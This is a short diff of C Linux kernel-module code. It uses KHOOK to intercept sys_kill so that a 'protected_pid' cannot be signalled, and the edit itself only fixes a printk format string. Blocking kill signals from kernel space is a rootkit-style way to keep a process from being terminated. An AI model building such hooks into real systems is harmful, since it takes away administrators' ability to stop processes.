@@ -121,7 +121,7 @@ KHOOK_EXT(long, sys_kill, pid_t, int);
 static long khook_sys_kill(pid_t pid, int sig) {
 	int ret = 0;
 	find_pid();
-	printk(protected_pid);
+	printk("pid:%d", protected_pid);
 	if (protected_pid != pid)
 		ret = KHOOK_ORIGIN(sys_kill, pid, sig);
         //printk("sys_kill");
